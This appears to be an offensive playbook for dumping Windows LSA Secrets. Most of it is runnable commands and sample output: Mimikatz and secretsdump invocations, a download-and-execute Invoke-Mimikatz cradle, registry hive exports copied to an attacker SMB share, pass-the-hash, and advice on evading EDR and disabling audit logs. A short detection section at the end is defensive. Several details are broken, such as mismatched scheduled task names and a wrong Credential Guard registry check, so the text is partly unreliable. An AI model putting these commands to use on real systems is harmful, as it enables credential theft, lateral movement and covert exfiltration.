# [CA-DUMP-003]: LSA Secrets Dump

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-003 |
| **MITRE ATT&CK v18.1** | [T1003.004 - OS Credential Dumping: LSA Secrets](https://attack.mitre.org/techniques/T1003/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint (All versions - XP, Vista, 7, 8, 8.1, 10, 11; Server 2003-2025) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Inherent Windows design; no patching applicable) |
| **Technique Status** | **ACTIVE** (Persistent registry storage; always exploitable with SYSTEM access) |
| **Last Verified** | 2026-01-02 |
| **Affected Versions** | Windows XP-11, Server 2003-2025 (all versions equally vulnerable) |
| **Patched In** | N/A - Registry structure is permanent Windows component |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

**Note:** LSA Secrets dumping is fundamentally different from LSASS credential dumping (T1003.001) and DCSync (T1003.006). While LSASS dumps are transient (in-memory cached credentials from active user sessions), LSA Secrets are **persistent registry-stored credentials** for service accounts, VPN connections, backup software, scheduled tasks, and domain-wide DPAPI recovery keys. No patch can eliminate this attack because the registry structure is essential to Windows operation. Mitigation relies entirely on access control (SYSTEM privilege restriction) and monitoring.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Local Security Authority (LSA) Secrets is a registry-based credential storage mechanism in Windows that stores plaintext or encrypted credentials for non-interactive accounts and services. The registry hive `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets` contains sensitive materials including: plaintext VPN credentials, backup service account passwords, scheduled task credentials, domain cached credentials, Kerberos keys, and critically—**the domain-wide DPAPI backup key** (an RSA private key that can decrypt DPAPI-protected secrets for every user in the domain). A threat actor with SYSTEM privileges can dump these secrets from the registry (using `reg.exe` or Mimikatz `lsadump::secrets`) or extract them from LSASS memory. The secrets are encrypted with DPAPI using the SysKey (boot key) derived from the SYSTEM registry hive. If the attacker also obtains the SYSTEM hive and SysKey, all LSA secrets can be decrypted offline, yielding plaintext credentials for services, VPNs, and backup systems—plus the master key for decrypting **all DPAPI-protected data in the entire domain**.

**Attack Surface:** Windows registry (specifically `HKLM\SECURITY\Policy\Secrets`), LSASS process memory (stores in-memory copies of LSA secrets), DPAPI encryption keys (stored in user profile directories and AD), domain directory (DPAPI backup key stored in AD).

**Business Impact:** **CRITICAL - Service Account Compromise, VPN/Backup Access, Domain-Wide DPAPI Breach.** Successfully dumping LSA secrets compromises:
- **Service Accounts:** Every service account's plaintext password (database admins, application service accounts, SQL Server, Exchange, SharePoint).
- **VPN/Remote Access:** Plaintext dial-up, VPN, and remote access credentials → direct access to network infrastructure.
- **Backup Systems:** Plaintext credentials for VEEAM, Nakivo, Acronis, Commvault → full backup access → access to historical data/bare-metal recovery.
- **Scheduled Tasks:** Credentials for task automation (batch jobs, administrative scripts) → ability to execute tasks as service accounts.
- **Domain DPAPI Key Exposure:** If domain backup DPAPI key is extracted, attacker can decrypt **all DPAPI-protected secrets for every user in the domain** (including cached credentials, vault passwords, RDP saved passwords, BitLocker recovery keys, SSL certificates, stored API keys, encrypted emails).

In a typical enterprise, LSA secrets dumping + domain DPAPI key = instant compromise of servers, backup systems, VPN infrastructure, and every user's local cached secrets. A single successful dump enables domain-wide persistence, lateral movement to all systems, and data exfiltration.

**Technical Context:**
- **Execution Time:** 5-10 seconds (faster than LSASS memory parsing).
- **Detection Risk:** **MEDIUM-HIGH** if Event 4657 (registry modification) logging is enabled; **LOW** if registry audit disabled.
- **Stealth:** **MEDIUM** - Registry access can blend with normal system activity; Mimikatz execution is signature-detected.
- **Success Indicators:** Event 4657 with `HKLM\SECURITY` path; Mimikatz process execution; `.save` files in `%TEMP%`.

### Operational Risk

- **Execution Risk:** **CRITICAL** - Service credentials cannot be uncompromised; VPN access lost indefinitely; domain-wide DPAPI key permanently exposed.
- **Stealth:** **LOW-MEDIUM** - Mimikatz is signature-detected; registry access patterns detectable with auditing; file artifacts created.
- **Reversibility:** **NO** - Requires password reset for all service accounts, VPN credential changes, backup system credential resets, and (if backup key exposed) domain-wide DPAPI key rotation (complex, unsupported operation).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.3.4 (SAM Hive), 5.3 (Account Policies) | Ensure registry hives containing credentials are protected; disable LM hash storage. |
| **DISA STIG** | WN10-CC-000005 (SYSTEM Privileges) | Restrict SYSTEM privilege access; audit registry access. |
| **CISA SCuBA** | Identity.1 (Credential Management) | Implement credential storage protections and audit credential access. |
| **NIST 800-53** | AC-2 (Account Management), SC-28 (Information at Rest), IA-5 (Password Management) | Protect credentials at rest; restrict access to credential storage; enforce complex passwords. |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Loss of plaintext credentials or DPAPI key = personal data breach; 72-hour notification required. |
| **DORA** | Art. 9 (Protection and Prevention), Art. 18 (ICT Testing) | EU financial institutions must protect and test credential security. |
| **NIS2** | Art. 21 (Cyber Risk Management), Art. 23 (Incident Reporting) | Critical infrastructure must secure and monitor credential storage. |
| **ISO 27001** | A.9.2.3 (Privileged Access), A.10.1.2 (Ownership), A.12.4.1 (Auditing) | Control privileged access; protect stored credentials; implement comprehensive audit logging. |
| **ISO 27005** | "Compromise of Authentication Infrastructure" | DPAPI key compromise = compromise of authentication infrastructure for entire domain. |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** SYSTEM or NT AUTHORITY\SYSTEM token (local or via impersonation).
- **Realistic Path:** User compromise → UAC bypass → SYSTEM elevation → registry access → LSA secrets dump.
- **Alternative (Offline):** Physical access to SYSTEM/SECURITY hives (via boot media, forensic disk access, or backup files).

**Required Access:**
- **Local:** Direct filesystem access to `%WINDIR%\System32\config\SECURITY` and `%WINDIR%\System32\config\SYSTEM` (for offline decryption).
- **Registry:** Read/write access to `HKEY_LOCAL_MACHINE\SECURITY` hive.
- **Memory (optional):** Access to LSASS process for in-memory extraction (if secrets are loaded).

**Supported Versions:**

| Windows Version | LSA Secrets Support | DPAPI Support | Viability |
|---|---|---|---|
| **XP-7** | ✅ Full | ✅ Yes | ✅ FULLY VULNERABLE |
| **8/8.1** | ✅ Full | ✅ Yes (enhanced) | ✅ FULLY VULNERABLE |
| **10 (all builds)** | ✅ Full | ✅ Yes (credential guard optional) | ✅ FULLY VULNERABLE |
| **11 (all builds)** | ✅ Full | ✅ Yes (credential guard default) | ⚠️ VULNERABLE (Credential Guard mitigates plaintext) |
| **Server 2003-2008** | ✅ Full | ✅ Yes | ✅ FULLY VULNERABLE |
| **Server 2012/R2** | ✅ Full | ✅ Yes | ✅ FULLY VULNERABLE |
| **Server 2016** | ✅ Full | ✅ Yes | ✅ FULLY VULNERABLE |
| **Server 2019/2022/2025** | ✅ Full | ✅ Yes (credential guard default domain joined) | ⚠️ VULNERABLE (Credential Guard reduces plaintext) |

**Tools:**
- [Mimikatz v2.2.0+ (lsadump::secrets module)](https://github.com/gentilkiwi/mimikatz) - Extract LSA secrets from registry or memory.
- [Impacket secretsdump.py](https://github.com/fortra/impacket) - Remote registry extraction.
- [reg.exe (native Windows)](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg) - Save registry hives.
- [PsExec (Sysinternals)](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) - Execute commands with SYSTEM privileges.
- [LaZagne](https://github.com/AlessandroZ/LaZagne) - Cross-platform credential dumping.
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) - SMB-based credential dumping.
- [gsecdump](https://github.com/chenthairan/gsecdump) - Legacy credential dumping tool.
- [DonPAPI](https://github.com/login-securite/DonPAPI) - DPAPI-specific dumping (domain backup key extraction).

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify LSA Secrets Stored on Target System

**Objective:** Enumerate what secrets are stored in the LSA registry hive to determine attack value.

#### PowerShell Reconnaissance

```powershell
# List all LSA Secret names (values stored under HKLM\SECURITY\Policy\Secrets)
$regPath = "HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets"
$secretKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SECURITY\Policy\Secrets")

if ($secretKey) {
    $secretNames = $secretKey.GetSubKeyNames()
    foreach ($secret in $secretNames) {
        Write-Host "[*] LSA Secret found: $secret"
    }
    $secretKey.Close()
} else {
    Write-Host "[-] Cannot access HKLM\SECURITY (need SYSTEM privileges)"
}

# Alternative: Using Mimikatz to enumerate
mimikatz # lsadump::secrets /system:C:\path\to\SYSTEM /security:C:\path\to\SECURITY
```

**What to Look For:**
- **Service Account Credentials** (e.g., `_SC_ServiceName` prefix) - SQL Server, Exchange, SharePoint, custom services.
- **VPN/Dial-up Credentials** (e.g., `L$RAS_*`, `L$RASPHONE_*`) - Remote access credentials.
- **Scheduled Task Credentials** (e.g., `L$TASK_*`) - Task automation credentials.
- **Domain Cached Credentials** (e.g., `L$DCC_*`) - Domain user credentials cached on non-DC systems.
- **Domain Kerberos Keys** (e.g., `L$KERBEROSMASTERKEY*`) - Domain-wide encryption keys.
- **DPAPI Backup Keys** (e.g., `L$BCKUPKEY_*`, `L$BCKUPKEY_PREFERRED`) - **Most valuable: domain-wide DPAPI decryption key**.

**Version Note:** Secret names and storage format unchanged across Windows XP-11 and Server 2003-2025.

---

### Step 2: Check DPAPI Configuration (Credential Guard Status)

**Objective:** Determine if Credential Guard is enabled, which isolates plaintext secrets in virtualized environment.

#### PowerShell Check

```powershell
# Check Credential Guard status
$dgStatus = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name Enabled -ErrorAction SilentlyContinue

if ($dgStatus.Enabled -eq 1) {
    Write-Host "[!] Credential Guard ENABLED - Plaintext secrets isolated in virtual environment"
    Write-Host "[!] Hashes/Kerberos keys still dumped; plaintext passwords mitigated"
} else {
    Write-Host "[+] Credential Guard DISABLED - All LSA secrets (including plaintext) vulnerable"
}

# Check LSA Protection (RunAsPPL) - Different from Credential Guard
$lsapp = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue
if ($lsapp.RunAsPPL -gt 0) {
    Write-Host "[!] LSA Protection enabled - Partial mitigation"
}
```

**Expected Output:**
- **Credential Guard disabled + LSA Protection disabled:** ✅ FULLY VULNERABLE - All secrets accessible.
- **Credential Guard enabled OR LSA Protection enabled:** ⚠️ PARTIALLY MITIGATED - Hashes accessible, plaintext passwords harder.

---

### Step 3: Verify SYSTEM Privilege Access

**Objective:** Confirm that current user can access SYSTEM registry hive and dump LSA secrets.

#### PowerShell Check

```powershell
# Try to access SECURITY hive (requires SYSTEM)
try {
    $securityKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SECURITY")
    if ($securityKey -ne $null) {
        Write-Host "[+] SYSTEM access confirmed - LSA secrets dumping VIABLE"
        $securityKey.Close()
    } else {
        Write-Host "[-] Cannot access SECURITY hive - Not SYSTEM"
    }
} catch {
    Write-Host "[-] Exception accessing SECURITY: $($_.Exception.Message)"
}

# Or test with Mimikatz directly
mimikatz # token::elevate
mimikatz # lsadump::secrets
# If successful: displays secrets. If failed: "ERROR kuhl_m_lsadump_secrets : GetKeyError"
```

**Expected Output (Success):**
```
[+] 5 LSA secrets found
Domain : EXAMPLE
Secret  : _SC_SQL2019
Type    : Generic
Value   : P@ssw0rd123
```

**Expected Output (Failure):**
```
[-] ERROR kuhl_m_lsadump_secrets : GetKeyError
[-] Access Denied to HKLM\SECURITY
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Mimikatz lsadump::secrets (Direct Registry Dumping)

**Supported Versions:** Windows XP-11, Server 2003-2025 (all versions).

#### Step 1: Launch Mimikatz with SYSTEM Privileges

**Objective:** Execute Mimikatz with SYSTEM token to access registry.

**Command (Command Prompt - Admin):**
```cmd
mimikatz.exe
```

**Command (PowerShell - Elevated):**
```powershell
C:\path\to\mimikatz.exe
```

**Expected Output:**
```
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb  3 2025 23:58:42 +0000
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin Delpy `gentilkiwi`
 '## v ##'   https://blog.gentilkiwi.com/mimikatz
  '#####.                             (UID=1234)

mimikatz #
```

**OpSec & Evasion:**
- **Detection likelihood: VERY HIGH** - Mimikatz binary is signature-detected by all EDR/AV.
- **Evasion:**
  - Rename binary to benign name (svchost.exe, rundll32.exe).
  - Execute from alternate parent process (explorer.exe instead of cmd.exe).
  - Use in-memory PowerShell execution: `IEX (New-Object Net.WebClient).DownloadString(...)`

---

#### Step 2: Elevate to SYSTEM Token (If Not Already SYSTEM)

**Objective:** Obtain SYSTEM privilege token to access restricted registry hive.

**Command (Mimikatz Interactive):**
```
token::elevate
```

**Expected Output:**
```
Token Id  : 0
User name : DOMAIN\Administrator
SID name  : S-1-5-21-...-500

640	{0;000003e7} 1 D 20224	     NT AUTHORITY\SYSTEM	S-1-5-18
impersonation token : {0;000003e7} 1 D 20224	     NT AUTHORITY\SYSTEM	S-1-5-18 (SYSTEM)
```

**What This Means:**
- **Token::elevate** changes Mimikatz's security context from user to SYSTEM.
- Subsequent commands execute with SYSTEM privileges.
- Allows access to protected registry hives.

**OpSec & Evasion:**
- **Detection likelihood: HIGH** - Token elevation attempts are logged in Event 4673.
- **Evasion:**
  - Run Mimikatz from context that already has SYSTEM (e.g., executed by scheduled task as SYSTEM).
  - Use alternative elevation methods (privilege escalation exploits) before Mimikatz launch.

---

#### Step 3: Dump LSA Secrets from Registry

**Objective:** Extract plaintext/encrypted credentials from registry hive.

**Command (Mimikatz Interactive):**
```
lsadump::secrets
```

**Command (One-Liner):**
```
mimikatz.exe "token::elevate" "lsadump::secrets" exit
```

**Command (PowerShell - In-Memory):**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command 'token::elevate' -Command 'lsadump::secrets'
```

**Expected Output:**
```
Microsoft Windows [Version 10.0.19045]
Domain : EXAMPLE
Secret  : _SC_SQL2019
Type    : Generic
Value   : MyP@ssw0rd123!

Domain : EXAMPLE
Secret  : _SC_Exchange_Service
Type    : Generic
Value   : ExchangePass123!

Domain : EXAMPLE
Secret  : L$RAS_VPN_Admin
Type    : Generic
Value   : VPN_Admin_Cred_12345

Domain : EXAMPLE
Secret  : L$BCKUPKEY_PREFERRED
Type    : Generic
Key Guid: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
Value   : [RSA Private Key Data - DPAPI Domain Backup Key]
```

**What This Means:**
- **_SC_SQL2019:** SQL Server service account password (plaintext).
- **L$RAS_VPN_Admin:** VPN credential (plaintext).
- **L$BCKUPKEY_PREFERRED:** Domain DPAPI backup key (can decrypt all domain user secrets).
- **Value field:** Plaintext passwords OR encrypted blobs (if credentials are DPAPI-protected).

**OpSec & Evasion:**
- **Detection likelihood: CRITICAL** - LSA secret dumping is signature-detected and generates audit events.
- **Evasion:**
  - Execute in hidden window: `powershell -WindowStyle Hidden`
  - Encode commands: Base64 obfuscation reduces keyword detection.
  - Execute during legitimate admin activity (backup windows, patch maintenance).

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "ERROR kuhl_m_lsadump_secrets : GetKeyError" | Not running as SYSTEM | Execute `token::elevate` first or run Mimikatz as SYSTEM-privileged process |
| "Access Denied" | Registry key protected | Ensure full SYSTEM privileges; may need SeBackupPrivilege |
| "No secrets found" | No LSA secrets configured | System may have minimal service accounts; check with reconnaissance step |
| "Invalid parameter" | Syntax error | Ensure command is exactly `lsadump::secrets` (no additional parameters for registry dump) |

**Command (Server 2022+ Variant - Credential Guard Bypass):**
```
# If Credential Guard enabled, plaintext unavailable but hashes still extracted
mimikatz # lsadump::secrets
# Hashes and keys output; plaintext passwords show as encrypted blobs
# Use DPAPI backup key (if extracted) to decrypt
```

---

### METHOD 2: Registry Hive Export + Offline Decryption (PsExec + reg.exe)

**Supported Versions:** Windows XP-11, Server 2003-2025 (all versions).

#### Step 1: Save SECURITY and SYSTEM Hives to Disk

**Objective:** Export registry hives for offline analysis (useful if SYSTEM access is restricted).

**Command (PsExec - Execute as SYSTEM):**
```cmd
psexec -accepteula -s reg save HKLM\SECURITY C:\temp\security.save
psexec -accepteula -s reg save HKLM\SYSTEM C:\temp\system.save
```

**Command (PowerShell - RunAs SYSTEM via Scheduled Task):**
```powershell
$taskAction = New-ScheduledTaskAction -Execute "reg.exe" -Argument 'save HKLM\SECURITY C:\temp\security.save'
Register-ScheduledTask -TaskName "LS export" -Action $taskAction -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest) -Force
Start-ScheduledTask -TaskName "LSA export"
# Files saved as: C:\temp\security.save, C:\temp\system.save
Remove-ScheduledTask -TaskName "LSA export" -Confirm:$false
```

**Expected Output:**
```
The operation completed successfully.
C:\temp\security.save (registry hive - binary file)
C:\temp\system.save (registry hive - binary file)
```

**What This Means:**
- **security.save:** Registry hive containing `HKLM\SECURITY` (LSA secrets).
- **system.save:** Registry hive containing `HKLM\SYSTEM` (SysKey boot key for decryption).
- Both required to decrypt LSA secrets offline.

**OpSec & Evasion:**
- **Detection likelihood: HIGH** - File creation in temp directory is detected; registry save operations logged in Event 4657.
- **Evasion:**
  - Save to network share instead of local disk: `reg save HKLM\SECURITY \\attacker-ip\share\security.save`
  - Exfiltrate immediately after creation; do not leave files on disk.
  - Disable Event 4657 logging before dump if possible (requires admin access).

---

#### Step 2: Extract Hives from Alternate Location (or Copy to Analysis System)

**Objective:** Transfer exported hives to analysis system for offline credential extraction.

**Command (Copy via Network):**
```powershell
Copy-Item -Path "C:\temp\security.save" -Destination "\\attacker-ip\share\exfil\"
Copy-Item -Path "C:\temp\system.save" -Destination "\\attacker-ip\share\exfil\"
```

**Command (Compress and Exfiltrate):**
```powershell
Compress-Archive -Path @("C:\temp\security.save", "C:\temp\system.save") -DestinationPath "C:\temp\hives.zip" -Force
# Transfer hives.zip via Exfil channel (HTTP/DNS/HTTPS)
```

---

#### Step 3: Decrypt LSA Secrets Offline Using Impacket

**Objective:** Analyze exported hives on attacker-controlled system to extract secrets without SYSTEM access.

**Command (Linux - Impacket secretsdump.py):**
```bash
# Offline registry analysis
secretsdump.py -security security.save -system system.save LOCAL

# Output:
# Domain Cached Credentials (DCC2):
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
# 
# LSA Secrets:
# SQL2019_PASSWORD: MyP@ssw0rd123!
# VPN_Credential: VPN_Admin_12345
# DPAPI_Backup_Key: [RSA Private Key]
```

**Expected Output:**
```
[*] Dumping local SAM hashes (from SAM registry hive)
[*] Dumping LSA Secrets
[*] Dumping Kerberos keys
[*] Dumping DPAPI backup key
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
_SC_SQL2019::MyP@ssw0rd123!
L$RAS_VPN::VPN_Admin_Cred_12345
L$BCKUPKEY_PREFERRED::[RSA Key Material]
```

**What This Means:**
- **Domain Cached Credentials:** Domain user credentials cached on local system (useful for offline cracking).
- **LSA Secrets:** Service account passwords, VPN credentials in plaintext.
- **Kerberos Keys:** AES keys for Kerberos authentication (used for overpass-the-hash).
- **DPAPI Backup Key:** Master decryption key for domain-wide DPAPI secrets.

**OpSec & Evasion:**
- **Detection likelihood: LOW** - Offline analysis occurs on attacker system; no events generated on target.
- **Advantage:** No real-time detection possible.
- **Disadvantage:** Requires exfiltration of hive files first.

---

### METHOD 3: Impacket secretsdump.py (Remote Registry Extraction)

**Supported Versions:** Windows XP-11, Server 2003-2025 (all versions).

#### Step 1: Execute Impacket secretsdump.py from Linux/Attack Machine

**Objective:** Remotely extract LSA secrets via registry access (no code execution on target).

**Command (Linux - Authenticated Access):**
```bash
secretsdump.py EXAMPLE/Administrator:P@ssw0rd123@192.168.1.100
```

**Command (Pass-the-Hash - Using NTLM Hash):**
```bash
secretsdump.py -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 EXAMPLE/Administrator@192.168.1.100
```

**Command (Kerberos Ticket - If Available):**
```bash
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py -k -no-pass EXAMPLE/Administrator@192.168.1.100
```

**Expected Output:**
```
Impacket v0.10.1.dev1 - Copyright 2023 SecureAuth Corporation

[*] Dumping local SAM hashes
[*] Dumping local SAM hashes (from registry)
[*] Dumping LSA Secrets
[*] Dumping Domain Cached Credentials

Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
_SC_SQL2019::MyP@ssw0rd123!
L$RAS_VPN::VPN_Admin_Cred_12345
L$BCKUPKEY_PREFERRED::[RSA Key Data]
```

**What This Means:**
- **Remote Extraction:** Secrets dumped over SMB (port 445) without loading hives locally.
- **Plaintext Passwords:** VPN and service account passwords extracted in plaintext.
- **DPAPI Key:** Domain backup key obtained (can decrypt all domain DPAPI secrets).

**OpSec & Evasion:**
- **Detection likelihood: MEDIUM-HIGH** - SMB traffic to registry detected; Event 4656/4657 logged on target.
- **Evasion:**
  - Execute during legitimate activity (admin tools accessing registry normal).
  - Use slow dumping rates (pause between reads).
  - Execute from unexpected source IP (compromised internal system, not obvious attacker IP).

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Connection refused" | SMB port 445 blocked | Check firewall; port 445 must be accessible |
| "Access Denied" | User lacks registry read permissions | Use admin credentials or SYSTEM account |
| "File not found" | SYSTEM/SECURITY hives not accessible | Ensure user has read access to `HKLM\SECURITY` and `HKLM\SYSTEM` |
| "Invalid credentials" | Wrong username/password | Verify correct domain, username, password |

---

### METHOD 4: LaZagne (Cross-Platform Credential Dumping)

**Supported Versions:** Windows XP-11, Server 2003-2025 (all versions).

#### Step 1: Download and Execute LaZagne

**Objective:** Use multi-platform credential dumping tool to extract LSA secrets and other stored credentials.

**Command (Windows - Download and Execute):**
```powershell
# Download LaZagne
$lazyagneURL = "https://github.com/AlessandroZ/LaZagne/releases/download/v3.0.0/Windows_LaZagne.exe"
Invoke-WebRequest -Uri $lazyagneURL -OutFile "C:\temp\lazagne.exe"

# Execute with LSA option
C:\temp\lazagne.exe all -p C:\temp\output.txt
```

**Command (Linux - Remotely via CrackMapExec):**
```bash
crackmapexec smb 192.168.1.100 -u Administrator -p P@ssw0rd123 -x "powershell -Command C:\temp\lazagne.exe all"
```

**Expected Output:**
```
[+] LSA Secrets:
    _SC_SQL2019 : MyP@ssw0rd123!
    L$RAS_VPN : VPN_Admin_Cred_12345
    Domain Kerberos Key : [AES Key Data]

[+] Vault Credentials:
    Generic Credential (SQL): myuser | MyP@ssw0rd123!

[+] Browsers:
    Chrome passwords : [Cached passwords]

[+] Wifi:
    SSID: EXAMPLE-WIFI | PSK: WiFiPassword123!
```

**What This Means:**
- **Multi-source credentialextraction:** LaZagne gathers credentials from LSA, vault, browsers, WiFi, etc.
- **Comprehensive harvesting:** Ideal for lateral movement (obtain WiFi passwords, SQL credentials, etc.).

**OpSec & Evasion:**
- **Detection likelihood: HIGH** - Mimics legitimate credential manager (may be AV-detected).
- **Evasion:**
  - Execute in user context (not admin) if possible (still extracts many credentials).
  - Use renamed binary (avoid "lazagne.exe" signature detection).
  - Execute from temp directory to avoid suspicious paths.

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Red Team Tests for T1003.004

| Test # | Test Name | Method | Tools Required | Supported Versions |
|---|---|---|---|---|
| 1 | Dumping LSA Secrets | Registry dump via PsExec + reg save | PsExec, reg.exe | All |
| 2 | Dump Kerberos Tickets from LSA | PowerShell-based Kerberos dumping | PowerShell dumper.ps1 | All |

### Running Atomic Red Team Tests

**Install Atomic Red Team:**
```powershell
$atomicRepoURL = "https://github.com/redcanaryco/atomic-red-team/archive/master.zip"
Invoke-WebRequest -Uri $atomicRepoURL -OutFile "C:\temp\atomic-red-team.zip"
Expand-Archive -Path "C:\temp\atomic-red-team.zip" -DestinationPath "C:\temp\atomic-red-team" -Force
```

**Execute T1003.004 Test #1 - Dumping LSA Secrets:**
```powershell
Invoke-AtomicTest T1003.004 -TestNumbers 1
```

**Expected Output (Test #1):**
```
Executing Atomic Test T1003.004.001 - Dumping LSA Secrets
[*] Test started at 2026-01-02 06:35:00
[+] PsExec executing: reg save HKLM\security\policy\secrets %temp%\secrets /y
[+] Registry hive saved to: C:\Users\Admin\AppData\Local\Temp\secrets
[+] File size: 45 KB
[*] Test completed at 2026-01-02 06:35:02
```

**Execute T1003.004 Test #2 - Dump Kerberos Tickets:**
```powershell
Invoke-AtomicTest T1003.004 -TestNumbers 2
```

**Expected Output (Test #2):**
```
Executing Atomic Test T1003.004.002 - Dump Kerberos Tickets from LSA
[*] Test started at 2026-01-02 06:35:05
[+] Downloading dumper.ps1 from GitHub
[+] Executing PowerShell Kerberos dumper
[+] [Server Ticket] 
    Server: krbtgt/EXAMPLE.COM
    Encrypted Key: [AES Key Data]
[+] [Service Ticket]
    Server: cifs/fileserver.example.com
    Encrypted Key: [AES Key Data]
[*] Test completed at 2026-01-02 06:35:08
```

### Cleanup After Testing
```powershell
Remove-Item "C:\temp\secrets" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\secrets" -Force -ErrorAction SilentlyContinue
```

**Reference:** [Atomic Red Team T1003.004 Test Suite](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [Mimikatz v2.2.0+](https://github.com/gentilkiwi/mimikatz)

**Current Version:** 2.2.0 (as of Jan 2026)
**Minimum Version:** 2.0.0 (supports LSA secrets; recommend 2.2.0+)
**Supported Platforms:** Windows XP-11, Server 2003-2025
**Requirements:** SYSTEM privileges for registry access.

**Installation:**
```powershell
$mimikatzURL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210101/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $mimikatzURL -OutFile "C:\temp\mimikatz.zip"
Expand-Archive -Path "C:\temp\mimikatz.zip" -DestinationPath "C:\temp\mimikatz" -Force
```

**Usage:**
```cmd
mimikatz.exe "token::elevate" "lsadump::secrets" exit
```

---

### [Impacket secretsdump.py](https://github.com/fortra/impacket)

**Current Version:** Latest (actively maintained)
**Minimum Version:** Latest
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)
**Requirements:** Network access to target SMB (port 445); domain credentials or NTLM hash.

**Installation:**
```bash
pip install impacket
```

**Usage:**
```bash
secretsdump.py EXAMPLE/Administrator:P@ssw0rd@192.168.1.100
secretsdump.py -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 EXAMPLE/Administrator@192.168.1.100
```

---

### [PsExec (Sysinternals)](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

**Current Version:** Latest (built-in on most Windows installations)
**Minimum Version:** v1.98+
**Supported Platforms:** Windows NT-11, Server 2003-2025
**Requirements:** Local or remote admin access.

**Installation:**
```powershell
$psexecURL = "https://download.sysinternals.com/files/PSTools.zip"
Invoke-WebRequest -Uri $psexecURL -OutFile "C:\temp\PSTools.zip"
Expand-Archive -Path "C:\temp\PSTools.zip" -DestinationPath "C:\temp\PSTools" -Force
```

**Usage:**
```cmd
psexec -accepteula -s reg save HKLM\SECURITY C:\temp\security.save
```

---

### [LaZagne](https://github.com/AlessandroZ/LaZagne)

**Current Version:** 3.0.0 (as of 2024)
**Minimum Version:** Latest
**Supported Platforms:** Windows XP-11, Linux, macOS
**Requirements:** User privileges (admin recommended for full credential access).

**Installation:**
```powershell
# Download precompiled binary
$lazagneURL = "https://github.com/AlessandroZ/LaZagne/releases/download/v3.0.0/Windows_LaZagne.exe"
Invoke-WebRequest -Uri $lazagneURL -OutFile "C:\temp\lazagne.exe"
```

**Usage:**
```cmd
lazagne.exe all
lazagne.exe all -p C:\temp\credentials.txt
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Registry Hive Dump (SAM/SECURITY/SYSTEM Save)

**Rule Configuration:**
- **Required Index:** main (or Windows Security event index)
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, CommandLine, Image, ParentImage
- **Alert Threshold:** Any occurrence of "reg save" with SAM/SECURITY/SYSTEM hives
- **Applies To Versions:** Windows XP-11, Server 2003-2025 (all versions)

**SPL Query:**
```spl
sourcetype=WinEventLog:Security EventCode=4688
(CommandLine="*reg*save*HKLM\\sam*" OR CommandLine="*reg*save*HKLM\\security*" OR CommandLine="*reg*save*HKLM\\system*")
| stats count by CommandLine, User, ComputerName, ParentImage
| where count >= 1
```

**What This Detects:**
- **EventCode 4688:** Process creation (reg.exe).
- **CommandLine:** Contains "reg save" with SAM, SECURITY, or SYSTEM hive names.
- **Alert:** High-risk command for credential dumping.

**Manual Configuration Steps (Splunk Web):**
1. Navigate to **Splunk** → **Search & Reporting** → **New Search**.
2. Paste SPL query above.
3. Click **Search** to validate.
4. Click **Save** → **Save as Alert**.
5. Configure:
   - **Name:** "Registry Hive Dump Detected (SAM/SECURITY/SYSTEM)"
   - **Run every:** 5 minutes
   - **Time range:** Last 10 minutes
6. **Trigger:** `count >= 1`
7. **Add Action:** Email/Slack to SOC.

---

### Rule 2: Mimikatz LSA Secrets Dumping

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** CommandLine, Image, ParentImage
- **Alert Threshold:** Any occurrence of "lsadump::secrets" or Mimikatz process
